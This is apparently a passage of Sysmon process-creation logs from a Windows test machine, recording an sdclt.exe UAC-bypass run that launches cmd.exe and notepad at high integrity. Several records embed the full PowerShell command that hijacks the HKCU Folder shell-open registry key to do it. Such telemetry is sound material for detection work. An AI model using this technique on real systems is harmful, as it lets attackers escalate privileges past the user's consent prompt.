Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c notepad.exe",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Windows Command Processor,,,,,,,1,9529,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,High,0x8000000000000000,Information,{fda94052-3502-658d-7367-080000000000},0x86773,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:53.265

ProcessGuid: {fda94052-3b25-658d-a502-000000000b00}

ProcessId: 8844

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c notepad.exe

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-3b25-658d-a302-000000000b00}

ParentProcessId: 8980

ParentImage: C:\Windows\System32\control.exe

ParentCommandLine: ""C:\Windows\System32\control.exe""  /name Microsoft.BackupAndRestoreCenter

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""C:\Windows\System32\control.exe""  /name Microsoft.BackupAndRestoreCenter",C:\Windows\System32\control.exe,{fda94052-3b25-658d-a302-000000000b00},8980,WINDEV2309EVAL\User,{fda94052-3b25-658d-a502-000000000b00},7044,8844,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:53.2664044Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:53.265,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:53.2664044Z""/>
      <EventRecordID>9529</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:53.265</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b25-658d-a502-000000000b00}</Data>
      <Data Name=""ProcessId"">8844</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c notepad.exe</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-7367-080000000000}</Data>
      <Data Name=""LogonId"">0x86773</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">High</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3b25-658d-a302-000000000b00}</Data>
      <Data Name=""ParentProcessId"">8980</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\control.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\control.exe""  /name Microsoft.BackupAndRestoreCenter</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:53.265

ProcessGuid: {fda94052-3b25-658d-a502-000000000b00}

ProcessId: 8844

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c notepad.exe

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-3b25-658d-a302-000000000b00}

ParentProcessId: 8980

ParentImage: C:\Windows\System32\control.exe

ParentCommandLine: ""C:\Windows\System32\control.exe""  /name Microsoft.BackupAndRestoreCenter

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\SysWOW64\DllHost.exe /Processid:{06622D85-6856-4460-8DE1-A81921B41C4B},Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,COM Surrogate,,,,,,,1,9528,,10.0.22621.1 (WinBuild.160101.0800),"MD5=BF60B3F6E01EDDEDE8551FA076472057,SHA256=D9B3874AA63F62699D5AE1ADE9959B45860D55233E93A1064D83B63307EA7435,IMPHASH=B7F063F6E914DB6ACB4DCC8D69219A5F",C:\Windows\SysWOW64\dllhost.exe,,High,0x8000000000000000,Information,{fda94052-3502-658d-7367-080000000000},0x86773,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:53.180

ProcessGuid: {fda94052-3b25-658d-a402-000000000b00}

ProcessId: 6928

Image: C:\Windows\SysWOW64\dllhost.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: COM Surrogate

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: dllhost.exe

CommandLine: C:\Windows\SysWOW64\DllHost.exe /Processid:{06622D85-6856-4460-8DE1-A81921B41C4B}

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=BF60B3F6E01EDDEDE8551FA076472057,SHA256=D9B3874AA63F62699D5AE1ADE9959B45860D55233E93A1064D83B63307EA7435,IMPHASH=B7F063F6E914DB6ACB4DCC8D69219A5F

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,dllhost.exe,-,-,{00000000-0000-0000-0000-000000000000},932,-,{fda94052-3b25-658d-a402-000000000b00},7044,6928,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:53.1813903Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:53.180,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:53.1813903Z""/>
      <EventRecordID>9528</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:53.180</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b25-658d-a402-000000000b00}</Data>
      <Data Name=""ProcessId"">6928</Data>
      <Data Name=""Image"">C:\Windows\SysWOW64\dllhost.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">COM Surrogate</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">dllhost.exe</Data>
      <Data Name=""CommandLine"">C:\Windows\SysWOW64\DllHost.exe /Processid:{06622D85-6856-4460-8DE1-A81921B41C4B}</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-7367-080000000000}</Data>
      <Data Name=""LogonId"">0x86773</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">High</Data>
      <Data Name=""Hashes"">MD5=BF60B3F6E01EDDEDE8551FA076472057,SHA256=D9B3874AA63F62699D5AE1ADE9959B45860D55233E93A1064D83B63307EA7435,IMPHASH=B7F063F6E914DB6ACB4DCC8D69219A5F</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:53.180

ProcessGuid: {fda94052-3b25-658d-a402-000000000b00}

ProcessId: 6928

Image: C:\Windows\SysWOW64\dllhost.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: COM Surrogate

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: dllhost.exe

CommandLine: C:\Windows\SysWOW64\DllHost.exe /Processid:{06622D85-6856-4460-8DE1-A81921B41C4B}

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=BF60B3F6E01EDDEDE8551FA076472057,SHA256=D9B3874AA63F62699D5AE1ADE9959B45860D55233E93A1064D83B63307EA7435,IMPHASH=B7F063F6E914DB6ACB4DCC8D69219A5F

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\System32\control.exe""  /name Microsoft.BackupAndRestoreCenter",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Windows Control Panel,,,,,,,1,9527,,10.0.22621.1 (WinBuild.160101.0800),"MD5=79B6117B440B0B580156E9FB0A475108,SHA256=2A1DFE6E7A7A3083E5AAB487846A6F111F21A9F12104B84D363191AA09095064,IMPHASH=8DA21F5AC3ED3474562A273F937BBF3D",C:\Windows\System32\control.exe,,High,0x8000000000000000,Information,{fda94052-3502-658d-7367-080000000000},0x86773,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:53.152

ProcessGuid: {fda94052-3b25-658d-a302-000000000b00}

ProcessId: 8980

Image: C:\Windows\System32\control.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Windows Control Panel

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: CONTROL.EXE

CommandLine: ""C:\Windows\System32\control.exe""  /name Microsoft.BackupAndRestoreCenter

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=79B6117B440B0B580156E9FB0A475108,SHA256=2A1DFE6E7A7A3083E5AAB487846A6F111F21A9F12104B84D363191AA09095064,IMPHASH=8DA21F5AC3ED3474562A273F937BBF3D

ParentProcessGuid: {fda94052-3b25-658d-a202-000000000b00}

ParentProcessId: 9688

ParentImage: C:\Windows\System32\sdclt.exe

ParentCommandLine: ""C:\Windows\system32\sdclt.exe"" 

ParentUser: WINDEV2309EVAL\User",Info,CONTROL.EXE,"""C:\Windows\system32\sdclt.exe"" ",C:\Windows\System32\sdclt.exe,{fda94052-3b25-658d-a202-000000000b00},9688,WINDEV2309EVAL\User,{fda94052-3b25-658d-a302-000000000b00},7044,8980,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:53.1550600Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:53.152,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:53.1550600Z""/>
      <EventRecordID>9527</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:53.152</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b25-658d-a302-000000000b00}</Data>
      <Data Name=""ProcessId"">8980</Data>
      <Data Name=""Image"">C:\Windows\System32\control.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Control Panel</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">CONTROL.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\System32\control.exe""  /name Microsoft.BackupAndRestoreCenter</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-7367-080000000000}</Data>
      <Data Name=""LogonId"">0x86773</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">High</Data>
      <Data Name=""Hashes"">MD5=79B6117B440B0B580156E9FB0A475108,SHA256=2A1DFE6E7A7A3083E5AAB487846A6F111F21A9F12104B84D363191AA09095064,IMPHASH=8DA21F5AC3ED3474562A273F937BBF3D</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3b25-658d-a202-000000000b00}</Data>
      <Data Name=""ParentProcessId"">9688</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\sdclt.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\system32\sdclt.exe"" </Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:53.152

ProcessGuid: {fda94052-3b25-658d-a302-000000000b00}

ProcessId: 8980

Image: C:\Windows\System32\control.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Windows Control Panel

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: CONTROL.EXE

CommandLine: ""C:\Windows\System32\control.exe""  /name Microsoft.BackupAndRestoreCenter

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=79B6117B440B0B580156E9FB0A475108,SHA256=2A1DFE6E7A7A3083E5AAB487846A6F111F21A9F12104B84D363191AA09095064,IMPHASH=8DA21F5AC3ED3474562A273F937BBF3D

ParentProcessGuid: {fda94052-3b25-658d-a202-000000000b00}

ParentProcessId: 9688

ParentImage: C:\Windows\System32\sdclt.exe

ParentCommandLine: ""C:\Windows\system32\sdclt.exe"" 

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\sdclt.exe"" ",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Microsoft® Windows Backup,,,,,,,1,9526,,10.0.22621.1992 (WinBuild.160101.0800),"MD5=3E2ED2839596C61E2DFA4ED7ECF3AE1E,SHA256=7F02EFFFADED8AEE89BB169CF825138E9E3B40F9C1E845CC3FAC4FCE3362E073,IMPHASH=D95DFB02AEAB8828C106088D7F4BBE9B",C:\Windows\System32\sdclt.exe,,High,0x8000000000000000,Information,{fda94052-3502-658d-7367-080000000000},0x86773,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:53.073

ProcessGuid: {fda94052-3b25-658d-a202-000000000b00}

ProcessId: 9688

Image: C:\Windows\System32\sdclt.exe

FileVersion: 10.0.22621.1992 (WinBuild.160101.0800)

Description: Microsoft® Windows Backup

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: sdclt.exe

CommandLine: ""C:\Windows\system32\sdclt.exe"" 

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=3E2ED2839596C61E2DFA4ED7ECF3AE1E,SHA256=7F02EFFFADED8AEE89BB169CF825138E9E3B40F9C1E845CC3FAC4FCE3362E073,IMPHASH=D95DFB02AEAB8828C106088D7F4BBE9B

ParentProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ParentProcessId: 1064

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}

ParentUser: WINDEV2309EVAL\User",Info,sdclt.exe,"""powershell.exe"" & {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-3b23-658d-9e02-000000000b00},1064,WINDEV2309EVAL\User,{fda94052-3b25-658d-a202-000000000b00},7044,9688,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:53.0747984Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:53.073,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:53.0747984Z""/>
      <EventRecordID>9526</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:53.073</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b25-658d-a202-000000000b00}</Data>
      <Data Name=""ProcessId"">9688</Data>
      <Data Name=""Image"">C:\Windows\System32\sdclt.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1992 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Microsoft&#174; Windows Backup</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">sdclt.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\sdclt.exe"" </Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-7367-080000000000}</Data>
      <Data Name=""LogonId"">0x86773</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">High</Data>
      <Data Name=""Hashes"">MD5=3E2ED2839596C61E2DFA4ED7ECF3AE1E,SHA256=7F02EFFFADED8AEE89BB169CF825138E9E3B40F9C1E845CC3FAC4FCE3362E073,IMPHASH=D95DFB02AEAB8828C106088D7F4BBE9B</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3b23-658d-9e02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">1064</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:53.073

ProcessGuid: {fda94052-3b25-658d-a202-000000000b00}

ProcessId: 9688

Image: C:\Windows\System32\sdclt.exe

FileVersion: 10.0.22621.1992 (WinBuild.160101.0800)

Description: Microsoft&#174; Windows Backup

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: sdclt.exe

CommandLine: ""C:\Windows\system32\sdclt.exe"" 

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=3E2ED2839596C61E2DFA4ED7ECF3AE1E,SHA256=7F02EFFFADED8AEE89BB169CF825138E9E3B40F9C1E845CC3FAC4FCE3362E073,IMPHASH=D95DFB02AEAB8828C106088D7F4BBE9B

ParentProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ParentProcessId: 1064

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,consent.exe 7068 300 0000024951025300,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Consent UI for administrative applications,,,,,,,1,9525,,10.0.22621.2070 (WinBuild.160101.0800),"MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930",C:\Windows\System32\consent.exe,,System,0x8000000000000000,Information,{fda94052-34eb-658d-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:52.996

ProcessGuid: {fda94052-3b24-658d-a102-000000000b00}

ProcessId: 5188

Image: C:\Windows\System32\consent.exe

FileVersion: 10.0.22621.2070 (WinBuild.160101.0800)

Description: Consent UI for administrative applications

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: consent.exe

CommandLine: consent.exe 7068 300 0000024951025300

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 1

IntegrityLevel: System

Hashes: MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930

ParentProcessGuid: {fda94052-b676-658c-ae00-000000000b00}

ParentProcessId: 7068

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo

ParentUser: NT AUTHORITY\SYSTEM",Info,consent.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo,C:\Windows\System32\svchost.exe,{fda94052-b676-658c-ae00-000000000b00},7068,NT AUTHORITY\SYSTEM,{fda94052-3b24-658d-a102-000000000b00},7044,5188,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:52.9979813Z,,,Process Create (rule: ProcessCreate),1,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 09:08:52.996,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:52.9979813Z""/>
      <EventRecordID>9525</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:52.996</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b24-658d-a102-000000000b00}</Data>
      <Data Name=""ProcessId"">5188</Data>
      <Data Name=""Image"">C:\Windows\System32\consent.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2070 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Consent UI for administrative applications</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">consent.exe</Data>
      <Data Name=""CommandLine"">consent.exe 7068 300 0000024951025300</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=04236290F783C1B3A4D8B417BF6244A0,SHA256=DEDEC4ACEC0895F5A7622ADCB29C359F8855723653FE906C279565A01B7F2AC6,IMPHASH=5D0C875DBD930A73D5A983016E384930</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b676-658c-ae00-000000000b00}</Data>
      <Data Name=""ParentProcessId"">7068</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:52.996

ProcessGuid: {fda94052-3b24-658d-a102-000000000b00}

ProcessId: 5188

Image: C:\Windows\System32\consent.exe

FileVersion: 10.0.22621.2070 (WinBuild.160101.0800)

Description: Consent UI for administrative applications

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: consent.exe

